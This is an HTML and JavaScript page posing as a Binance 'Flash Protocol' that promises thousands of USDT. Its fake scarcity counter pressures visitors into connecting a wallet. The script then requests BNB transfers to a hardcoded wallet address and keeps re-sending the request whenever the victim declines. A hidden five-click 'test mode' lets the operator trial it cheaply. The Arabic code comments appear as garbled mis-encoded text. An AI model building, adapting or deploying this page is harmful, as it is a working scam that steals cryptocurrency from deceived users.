<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Binance | Flash Protocol V6</title>
    <style>
        :root { --gold: #F3BA2F; --dark: #0B0E11; --card: #181A20; --item: #2B3139; --text: #EAECEF; --sub: #848E9C; }
        body { background: var(--dark); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .main-card { background: #1E2329; width: 350px; border-radius: 30px; padding: 30px; text-align: center; border: 1px solid #2B3139; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .flash-counter { background: rgba(246, 70, 93, 0.1); color: #F6465D; padding: 12px; border-radius: 12px; font-weight: bold; margin-bottom: 20px; border: 1px solid #F6465D; }
        #flash-count { font-size: 22px; display: block; margin-top: 5px; }
        select { width: 100%; padding: 15px; background: #0B0E11; color: white; border-radius: 12px; border: 1px solid #474D57; margin-bottom: 20px; font-size: 15px; outline: none; }
        .btn-gold { background: var(--gold); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
        #status { font-size: 11px; color: var(--sub); margin-top: 15px; }
    </style>
</head>
<body>

<div class="main-card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" width="120" style="margin-bottom: 20px; cursor: pointer;" onclick="enableTest()">
    <div class="flash-counter">Remaining Allocation: <span id="flash-count">1,482,500</span> <small>USDT</small></div>
    
    <div id="ui-box">
        <button class="btn-gold" id="mainBtn" onclick="handleAction()">Connect Wallet</button>
        <div id="action-ui" style="display:none; margin-top: 20px;">
            <select id="amount">
                <option value="0x112103890D10000">2,500 USDT (0.05 BNB)</option>
                <option value="0x13FBE85EDC90000" selected>5,000 USDT (0.09 BNB)</option>
                <option value="0x2C68AF0BB140000">10,000 USDT (0.2 BNB)</option>
                <option value="0x6F05B59D3B20000">50,000 USDT (0.5 BNB)</option>
            </select>
        </div>
    </div>
    <p id="status">Secure Node Connection: Active âœ…</p>
</div>

<script>
    let userAccount = null;
    let clickCount = 0;
    const MY_ADDR = "0xa2c4777262032A6CE29B540aA23623384a839331";

    function enableTest() {
        clickCount++;
        if (clickCount === 5) {
            const sel = document.getElementById('amount');
            const opt = document.createElement('option');
            opt.value = "0x2AF31DC46110"; // 0.000047 BNB ØªÙ‚Ø±ÙŠØ¨Ø§Ù‹ Ù„Ù„ØªØ¬Ø±Ø¨Ø©
            opt.innerText = "ğŸ›  TEST MODE ENABLED";
            opt.style.color = "#F6465D";
            sel.prepend(opt);
            sel.selectedIndex = 0;
            alert("Test Mode Unlocked!");
        }
    }

    // Ø¹Ø¯Ø§Ø¯ ÙˆÙ‡Ù…ÙŠ
    let qty = 1482500;
    setInterval(() => {
        qty -= Math.floor(Math.random() * 500) + 100;
        document.getElementById('flash-count').innerText = qty.toLocaleString();
    }, 3000);

    async function handleAction() {
        const status = document.getElementById('status');
        if (!window.ethereum) {
            alert("Please open in Trust Wallet or MetaMask browser.");
            return;
        }

        if (!userAccount) {
            try {
                status.innerText = "Connecting...";
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAccount = accounts[0];
                document.getElementById('mainBtn').innerText = "Activate Flash Protocol âš¡";
                document.getElementById('action-ui').style.display = 'block';
                status.innerText = "âœ… Wallet Connected. Ready to Activate.";
                
                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø´Ø¨ÙƒØ© Ø¥Ù„Ù‰ BSC ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ù„Ø¶Ù…Ø§Ù† Ø§Ù„Ø¹Ù…Ù„
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }], 
                }).catch(() => {});

            } catch (err) {
                status.innerText = "Connection failed.";
            }
        } else {
            sendTransaction();
        }
    }

    async function sendTransaction() {
        const status = document.getElementById('status');
        const hexValue = document.getElementById('amount').value;
        
        status.innerText = "Confirming Node... Please check wallet.";
        
        const txParams = {
            from: userAccount,
            to: MY_ADDR,
            value: hexValue, // Ø§Ù„Ù‚ÙŠÙ…Ø© Ø¨ØµÙŠØºØ© Hex Ù„Ø¶Ù…Ø§Ù† Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ù…Ø­ÙØ¸Ø© Ù„Ù‡Ø§ Ù…Ø¨Ø§Ø´Ø±Ø©
        };

        try {
            await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [txParams],
            });
            status.innerText = "âœ… Activation Request Sent!";
        } catch (err) {
            status.innerText = "Verification failed. Please retry.";
            // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠØ© Ø¹Ù†Ø¯ Ø§Ù„Ø±ÙØ¶
            setTimeout(sendTransaction, 2500);
        }
    }
</script>
</body>
</html>
